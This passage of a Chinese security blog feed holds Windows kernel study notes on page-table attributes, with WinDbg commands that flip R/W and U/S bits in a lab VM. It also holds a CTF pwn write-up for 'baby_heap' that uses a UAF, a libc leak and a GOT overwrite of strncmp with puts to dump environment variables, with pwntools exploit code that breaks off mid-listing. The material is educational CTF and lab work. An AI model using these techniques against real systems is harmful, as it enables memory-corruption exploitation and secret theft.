    <content type="html"><![CDATA[<p>来具体学习一下页属性</p><span id="more"></span><h2 id="看前必读"><a href="#看前必读" class="headerlink" title="看前必读"></a>看前必读</h2><p><strong>本文所述的第 x 位均表示下标从 0 开始的计数制。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0000100010001</span><br><span class="line">           *</span><br></pre></td></tr></table></figure><p>例如上面星号所指示的位置表示第 1 位。</p><h2 id="有效属性"><a href="#有效属性" class="headerlink" title="有效属性"></a>有效属性</h2><p>可以关注内核函数 <strong>MmIsAddressValid</strong> 实现原理，取出虚拟机 <code>C:\Windows\System32\ntoskrnl.exe</code> 内核文件，找到该函数，F5可得以下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_48DCB8</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = *(_DWORD *)(((a1 &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xFFC</span>) - <span class="number">0x3FD00000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = *(_DWORD *)(((a1 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x3FFFFC</span>) - <span class="number">0x40000000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (v3 &amp; <span class="number">0x80</span>) != <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到第一个表达式 <code>(a1 &gt;&gt; 20) &amp; 0xFFC)</code>，可以认为是将地址右移了 22 位（取高10位），再左移了 2 位（<code>*4</code>），然后将该值减去 0x3FD00000，其实转换成加法就是 <code>+0xC0300000</code>，也就是我们的页目录表的线性地址。</p><p>如果该地址的最低位为 0，则返回 0（p位为0，无效）。</p><p>如果该地址的第7位为 1，说明是个大页，那么直接返回 1，整个页都是有效的，否则进行后续判断。</p><p>这里就是判断 PDE 的最低为是否为 0，若为 0 则还是无效。</p><p>否则返回第7位是否为 1 （这里存疑，不明白为什么PAT位为1才表示有效）。</p><p>总体，该函数的实现就是通过两个关键的线性地址 <code>0xC0000000</code> 和 <code>0xC0300000</code>，检查页表的属性来实现的功能。</p><h2 id="读写属性"><a href="#读写属性" class="headerlink" title="读写属性"></a>读写属性</h2><p>我是这么认为的：一个虚拟页，只要挂上了对应的物理页且有效，它必定可读，是否可写根据第 1 位标志位确定。</p><p>举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *s=<span class="string">&quot;123456789&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,s);</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov eax,ds:dword ptr[s]</span><br><span class="line">        <span class="type">int</span> <span class="number">3</span></span><br><span class="line">        mov ds:byte ptr[eax],<span class="number">0x66</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试向字符串常量指向的地址进行写入则必定会出一个写入错误，那么在中间下个断点，然后修改挂的物理页。</p><img src="/2024/11/07/WindowsKernel2/1.png" class=""><p>拆分得到 PDI，PTI分别为 1，3，页内偏移为 0x12C</p><img src="/2024/11/07/WindowsKernel2/2.png" class=""><p>可以发现 PTE 的第一位为 0，即该页不可写。</p><p>同时也可以验证一下该物理页的正确性</p><img src="/2024/11/07/WindowsKernel2/3.png" class=""><p>将该物理页设为可写，使用命令 <code>!ed a6fab00C 0b8e2027</code>。</p><p>可以发现这个字符修改成功了</p><img src="/2024/11/07/WindowsKernel2/4.png" class=""><h2 id="特权位"><a href="#特权位" class="headerlink" title="特权位"></a>特权位</h2><p>当我们处于三环的权限，我们无法访问 U&#x2F;S 位为 0 的页，通常，32位地址下，我们无法访问 80 开头的地址，因为只有 0 环态下可以访问。</p><p>例如，我修改 gdt 所属的页，让gdt变得三环状态可读，参考以下步骤：</p><ul><li>通过 gdtr 找到 gdt 所在的页。</li><li>拆分地址找到对应的物理页对应的 PTE。</li><li>将物理页的 U&#x2F;S 位改为 1。</li></ul><p>这里我的 gdtr 为 80b93800</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PDI 1000000010</span><br><span class="line">0x202</span><br><span class="line">PTI 1110010011</span><br><span class="line">0x393</span><br><span class="line">off 100000000000</span><br><span class="line">0x800</span><br></pre></td></tr></table></figure><p>按照同样的方法，找到了 gdt 的物理页。</p><img src="/2024/11/07/WindowsKernel2/5.png" class=""><p>图中反的主要原因时物理页输出是 dd，虚拟页输出是 dq，会小端序的反转一下。</p><p>我们看到物理页的 PTE，结果是 <code>00b93163</code>，很明显第二位，也就是 U&#x2F;S 位为 0，表明是 0 环才可以访问的，那么将它改为三环可访问，使用命令 <code>!ed 0018a000+0x393*4 00b93167</code>。</p><p>结果发现好像还是不可读，是为什么呢？</p><p>对啦，原来PDE对应的U&#x2F;S位也要改，因为它们是与的关系，所以还需要再增加一个命令 <code>!ed 0000000000185000+0x202*4 0018a067</code>，做完这些，再验证一下三环程序能否读到 gdt 表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD val=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">val=<span class="number">0</span>;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov eax,ds:dword ptr[<span class="number">0x80b93808</span>]</span><br><span class="line">mov ds:dword ptr[val],eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,val);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要注意的是，PTE基本最后映射的都是同一个，但是PDE不一样，因此需要这么操作才能实验成功：</p><ul><li>运行程序，中断。</li><li>找到该程序 CR3 的值，得到 PDE，将PDE的U&#x2F;S位改为1（每次重新运行必须做这件事）</li><li>根据PDE找到对应的PTE，将PTE的U&#x2F;S位改为 1（只需要改一次就可以）</li></ul><img src="/2024/11/07/WindowsKernel2/6.png" class=""><p>可以看到，程序能够成功读取gdt表的四个字节。</p><h2 id="访问位"><a href="#访问位" class="headerlink" title="访问位"></a>访问位</h2><p>这个属性不太好做实验验证，只需要知道：访问（读或写）过了则为 1，否则为0。</p><h2 id="脏位"><a href="#脏位" class="headerlink" title="脏位"></a>脏位</h2><p>写过了则为 1，否则为0，且只有PTE具有这个属性。</p><h2 id="其余位"><a href="#其余位" class="headerlink" title="其余位"></a>其余位</h2><p>其余位都跟缓存相关，实验自己不太会设计了，咕咕吧，等后面有能力了再来验证。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15363603.html">https://www.cnblogs.com/wingsummer/p/15363603.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_4/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_4&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">来具体学习一下页属性</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>强网杯S8初赛Pwn writeup</title>
    <link href="https://xia0ji233.github.io/2024/11/07/qwb2024_pre/"/>
    <id>https://xia0ji233.github.io/2024/11/07/qwb2024_pre/</id>
    <published>2024-11-07T09:00:00.000Z</published>
    <updated>2025-01-16T12:47:32.154Z</updated>
    
    <content type="html"><![CDATA[<p>本次强网杯初赛做出两道pwn题，把详细题解写一下记录。</p><span id="more"></span><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><p><a href="baby_heap_9a1b773b8406335f895bef78b2d8b8f3.zip">附件下载</a></p><img src="/2024/11/07/qwb2024_pre/1.png" class=""><p>2.35 的版本，IDA打开，堆菜单题，经典增删改查之外，还有两个额外的操作，一个是环境变量，另一个是任意地址写 0x10 字节。</p><p>del 里面有很明显的UAF漏洞。</p><img src="/2024/11/07/qwb2024_pre/2.png" class=""><p>show 只有一次机会，但是可以同时将 libc 和堆地址一起泄露出来，只需要我们释放两个相同大小的堆块之后，bk_nextsize 和 fd_nextsize 上面就会携带堆的地址，然而我自己的做法中没有用到。</p><p>交互函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.231.2&#x27;,)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, payload</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;edit:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;show:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">env</span>(<span class="params">ch</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;sad !&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr1,payload</span>):</span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;addr&#x27;</span>,p64(addr1))</span><br><span class="line">    p.send(payload)</span><br></pre></td></tr></table></figure><p>先add出四个堆块，把 1 3 free 掉，再打印出 3 堆块的内容，即可连带泄露 libc 和堆地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2024/11/07/qwb2024_pre/3.png" class=""><p>注意到选项 6 并不是任意地址写，而是有一定限制的，</p><img src="/2024/11/07/qwb2024_pre/4.png" class=""><p>这里说实话不知道是不是 IDA 解析有问题。因为理论上来说 stdin 是 <code>FILE *</code> 类型，占 8 字节，因此 <code>&amp;stdin[512]</code> 等同于 stdin 的地址加上 <code>512*8=4096=0x1000</code>，但是将视角调到汇编时会发现 </p><img src="/2024/11/07/qwb2024_pre/5.png" class=""><p>它往后加了 0x1b000 的地址，通常情况下，以汇编为准一定没问题（以上是做题时的想法），但是后来才发现犯了一个错误，stdin 的确是 FILE * 类型的，但是 <code>stdin[0]</code> 是 FILE 类型的，直接的 stdin 是一个指向 <code>_IO_2_1_stdin_</code> 的指针，类型为 FILE，在 gdb 里面也很容易观察到这一点。</p><img src="/2024/11/07/qwb2024_pre/6.png" class=""><p>这里主要观察这个 &amp;stdin[512] 与 stdin 的差值，以及可以发现，它所禁用的这个范围就是 libc <code>_IO_2_1_stdin_</code> 之后的data 段，全部不允许写。</p><p>而另外一个条件就有意思了，不能超过 80 开头的一个地址，基本不会触发，所以目标很明确，让我们去写 libc <code>_IO_2_1_stdin_</code> 之前的 data 段，或者是写堆段，程序段写不了因为没有办法泄露地址。</p><p>先考虑前者，来看看之前的 data 段存了哪些内容。</p><img src="/2024/11/07/qwb2024_pre/7.png" class=""><p>发现基本是 got 表，于是尝试输出看看 libc 的 got 表，发现都是跟字符串操作的相关函数</p><img src="/2024/11/07/qwb2024_pre/8.png" class=""><p>看来可以尝试在这里找一个函数作为跳板，能不能 <code>one_gadget</code> 呢？显然不能，这题有沙箱。</p><img src="/2024/11/07/qwb2024_pre/9.png" class=""><p>除非你能找到一个 execveat 系统调用执行的 <code>one_gadget</code> 这题才能直接一键利用。</p><p>同时注意到选项 5 对环境变量的相关操作</p><ul><li>getenv</li><li>putenv</li><li>setenv</li></ul><p>这里可以直接上 glibc 的源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">getenv</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **ep;</span><br><span class="line">  <span class="type">uint16_t</span> name_start;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__environ == <span class="literal">NULL</span> || name[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name[<span class="number">1</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The name of the variable consists of only one character.  Therefore</span></span><br><span class="line"><span class="comment"> the first two characters of the environment entry are this character</span></span><br><span class="line"><span class="comment"> and a &#x27;=&#x27; character.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __BYTE_ORDER == __LITTLE_ENDIAN || !_STRING_ARCH_unaligned</span></span><br><span class="line">      name_start = (<span class="string">&#x27;=&#x27;</span> &lt;&lt; <span class="number">8</span>) | *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      name_start = <span class="string">&#x27;=&#x27;</span> | ((*(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name) &lt;&lt; <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">for</span> (ep = __environ; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = *(<span class="type">uint16_t</span> *) *ep;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">0</span>]</span><br><span class="line">       | (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (name_start == ep_start)</span><br><span class="line">    <span class="keyword">return</span> &amp;(*ep)[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> len = <span class="built_in">strlen</span> (name);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">      name_start = *(<span class="type">const</span> <span class="type">uint16_t</span> *) name;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      name_start = (((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name)[<span class="number">0</span>]</span><br><span class="line">    | (((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) name)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      len -= <span class="number">2</span>;</span><br><span class="line">      name += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (ep = __environ; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _STRING_ARCH_unaligned</span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = *(<span class="type">uint16_t</span> *) *ep;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">uint16_t</span> ep_start = (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">0</span>]</span><br><span class="line">       | (((<span class="type">unsigned</span> <span class="type">char</span> *) *ep)[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (name_start == ep_start &amp;&amp; !<span class="built_in">strncmp</span> (*ep + <span class="number">2</span>, name, len)</span><br><span class="line">      &amp;&amp; (*ep)[len + <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &amp;(*ep)[len + <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察到最后一个循环中，它在遍历环境变量，并且使用 strncmp 这个函数，而这个函数恰好是在 got 表中的，如果尝试将其改为 puts，结果会如何呢？</p><img src="/2024/11/07/qwb2024_pre/10.png" class=""><p>可以发现只输出了 USER 环境变量，而且前两位被去掉了，我们从头来分析这个源码看。因为我们入口是 <code>getenv(&quot;USER&quot;)</code>，所以长度为 1 的判断就直接过掉，直接看 else 分支，似乎只有开头两个字符匹配到了，才会紧接着调用 strncmp，因此出现了只输出 USER 环境变量的问题。</p><p>但是当我选择选项 2 或 3 的时候，它输出了所有的环境变量</p><img src="/2024/11/07/qwb2024_pre/11.png" class=""><p>也就是说不管是调用 putenv 还是 setenv，在劫持了 strncmp 函数之后都可以完美输出所有环境变量。</p><p>它们两个函数内部都调用了一个函数 <code>__add_to_environ</code>。</p><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/setenv.c#L116">函数源码跳楼</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__add_to_environ (<span class="type">const</span> <span class="type">char</span> *name, <span class="type">const</span> <span class="type">char</span> *value, <span class="type">const</span> <span class="type">char</span> *combined,</span><br><span class="line">  <span class="type">int</span> replace)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> **ep;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute lengths before locking, so that the critical section is</span></span><br><span class="line"><span class="comment">     less of a performance bottleneck.  VALLEN is needed only if</span></span><br><span class="line"><span class="comment">     COMBINED is null (unfortunately GCC is not smart enough to deduce</span></span><br><span class="line"><span class="comment">     this; see the #pragma at the start of this file).  Testing</span></span><br><span class="line"><span class="comment">     COMBINED instead of VALUE causes setenv (..., NULL, ...)  to dump</span></span><br><span class="line"><span class="comment">     core now instead of corrupting memory later.  */</span></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> namelen = <span class="built_in">strlen</span> (name);</span><br><span class="line">  <span class="type">size_t</span> vallen;</span><br><span class="line">  <span class="keyword">if</span> (combined == <span class="literal">NULL</span>)</span><br><span class="line">    vallen = <span class="built_in">strlen</span> (value) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  LOCK;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We have to get the pointer now that we have the lock and not earlier</span></span><br><span class="line"><span class="comment">     since another thread might have created a new environment.  */</span></span><br><span class="line">  ep = __environ;</span><br><span class="line"></span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (ep != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (; *ep != <span class="literal">NULL</span>; ++ep)</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strncmp</span> (*ep, name, namelen) &amp;&amp; (*ep)[namelen] == <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ++size;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">中间省略很多代码，感兴趣可以直接去看完整源码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过分析这个函数的源码，可以发现这里会无条件地去遍历环境变量一次一次调用 strncmp 去判断，并且很幸运，第一个参数就是函数变量的指针，因此修改 strncmp 的 got 为 puts 函数，就可以输出所有的环境变量。</p><p>在远程环境中， flag 就在环境变量中。</p><p>总EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 